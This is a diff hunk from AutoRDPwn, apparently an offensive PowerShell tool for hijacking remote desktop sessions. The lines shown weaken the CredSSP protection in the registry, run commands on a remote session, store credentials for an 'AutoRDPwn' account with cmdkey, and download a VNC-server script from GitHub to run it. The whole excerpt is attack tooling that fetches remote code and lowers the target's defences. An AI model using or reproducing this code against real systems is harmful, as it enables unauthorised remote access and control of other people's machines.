@@ -550,8 +550,8 @@ function Remove-Exclusions {
     $AllowEncryptionOracle = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters").AllowEncryptionOracle
     New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" -Name AllowEncryptionOracle -Value 2 -PropertyType DWORD -Force 2>&1> $null
 
-    Write-Host ; Write-Host "$txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername } ; Write-Host
-    Write-Host "$txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray ;  if($hash) { invoke-command -session $RDP[0] -scriptblock { cmdkey /add:$using:computer /user:AutoRDPwn /pass:AutoRDPwn }}
+    Write-Host ; Write-Host "$txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock { $env:computername }
+    Write-Host ; Write-Host "$txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray ;  if($hash) { cmdkey /add:$computer /user:AutoRDPwn /pass:AutoRDPwn }
     $version = invoke-command -session $RDP[0] -scriptblock { (Get-WmiObject -class Win32_OperatingSystem).Caption } ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host
 
     if($vncserver){ $base64 = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-VNCServer.ps1')
